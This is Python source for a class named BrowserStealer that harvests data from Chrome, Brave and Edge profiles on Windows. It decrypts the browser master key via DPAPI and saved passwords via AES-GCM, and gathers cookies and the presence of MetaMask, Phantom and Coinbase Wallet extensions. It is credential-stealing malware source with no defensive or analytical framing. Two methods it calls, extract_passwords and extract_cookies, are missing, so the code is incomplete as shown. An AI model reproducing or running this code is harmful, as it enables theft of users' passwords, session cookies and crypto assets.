import os
import json
import base64
import sqlite3
import shutil
from Crypto.Cipher import AES
import win32crypt
import asyncio

class BrowserStealer:
    def __init__(self):
        self.browsers = {
            "Chrome": os.path.expanduser("~/AppData/Local/Google/Chrome/User Data"),
            "Brave": os.path.expanduser("~/AppData/Local/BraveSoftware/Brave-Browser/User Data"),
            "Edge": os.path.expanduser("~/AppData/Local/Microsoft/Edge/User Data")
        }
    
    async def get_encryption_key_chrome_127(self, browser_path):
        try:
            local_state_path = os.path.join(browser_path, "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except Exception as e:
            print(f"Key extraction failed: {e}")
            return None
    
    async def decrypt_password_chrome_127(self, password_value, key):
        try:
            iv = password_value[3:15]
            encrypted_password = password_value[15:-16]
            tag = password_value[-16:]
            
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt_and_verify(encrypted_password, tag)
            return decrypted_password.decode()
        except Exception as e:
            try:
                return win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1].decode()
            except:
                return f"Decryption failed: {str(e)}"
    
    async def extract_browser_data(self, browser_name, browser_path):
        results = {}
        key = await self.get_encryption_key_chrome_127(browser_path)
        for profile in os.listdir(browser_path):
            profile_path = os.path.join(browser_path, profile)
            if os.path.isdir(profile_path):
                profile_data = await self.extract_profile_data(profile_path, key)
                if profile_data:
                    results[profile] = profile_data
        
        return results
    
    async def extract_profile_data(self, profile_path, key):
        data = {}
        login_data_path = os.path.join(profile_path, "Login Data")
        if os.path.exists(login_data_path):
            data["passwords"] = await self.extract_passwords(login_data_path, key)
        cookies_path = os.path.join(profile_path, "Network", "Cookies")
        if os.path.exists(cookies_path):
            data["cookies"] = await self.extract_cookies(cookies_path, key)
        data["wallet_extensions"] = await self.extract_wallet_extensions(profile_path)
        
        return data
    
    async def extract_wallet_extensions(self, profile_path):
        extensions_path = os.path.join(profile_path, "Local Extension Settings")
        wallets = {}
        
        if os.path.exists(extensions_path):
            wallet_extensions = {
                "nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
                "bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
                "hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase Wallet"
            }
            
            for ext_id, name in wallet_extensions.items():
                ext_path = os.path.join(extensions_path, ext_id)
                if os.path.exists(ext_path):
                    wallets[name] = "Found"
        
        return wallets

async def extract_all_browser_data():
    stealer = BrowserStealer()
    results = {}
    
    for browser_name, browser_path in stealer.browsers.items():
        if os.path.exists(browser_path):
            results[browser_name] = await stealer.extract_browser_data(browser_name, browser_path)
    
    return results